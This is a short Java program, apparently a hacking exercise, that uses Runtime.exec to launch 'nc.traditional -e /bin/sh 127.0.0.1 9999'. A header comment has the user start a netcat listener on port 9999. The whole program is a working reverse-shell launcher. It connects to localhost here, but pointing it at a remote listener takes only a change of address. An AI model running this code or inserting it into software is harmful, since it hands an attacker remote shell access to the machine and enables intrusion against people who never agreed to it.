// initial code from http://www.javaworld.com/article/2071275/core-java/when-runtime-exec---won-t.html?page=2
//
// Netcat approach from http://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat/
//
// (client listener: netcat -lvp 9999)

import java.util.*;
import java.io.*;
class StreamGobbler extends Thread
{
    InputStream is;
    String type;
    
    StreamGobbler(InputStream is, String type)
    {
        this.is = is;
        this.type = type;
    }
    
    public void run()
    {
        try
        {
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader br = new BufferedReader(isr);
            String line=null;
            while ( (line = br.readLine()) != null)
                System.out.println(type + ">" + line);    
            } catch (IOException ioe)
              {
                ioe.printStackTrace();  
              }
    }
}
public class ExecRemoteShell
{
    public static void main(String args[])
    {
        try
        {            
            String[] cmd = new String[5];

            // nc.traditional -e /bin/sh 127.0.0.1 9999
            cmd[0] = "nc.traditional";
            cmd[1] = "-e";
            cmd[2] = "/bin/sh";
            cmd[3] = "127.0.0.1";
            cmd[4] = "9999";
            
            Runtime rt = Runtime.getRuntime();

            System.out.println("Execing");

            Process proc = rt.exec(cmd);

            // any error message?
            StreamGobbler errorGobbler = new 
                StreamGobbler(proc.getErrorStream(), "ERROR");            
            
            // any output?
            StreamGobbler outputGobbler = new 
                StreamGobbler(proc.getInputStream(), "OUTPUT");
                
            // kick them off
            errorGobbler.start();
            outputGobbler.start();
                                    
            // any error???
            int exitVal = proc.waitFor();
            System.out.println("ExitValue: " + exitVal);        
        } catch (Throwable t)
          {
            t.printStackTrace();
          }
    }
}
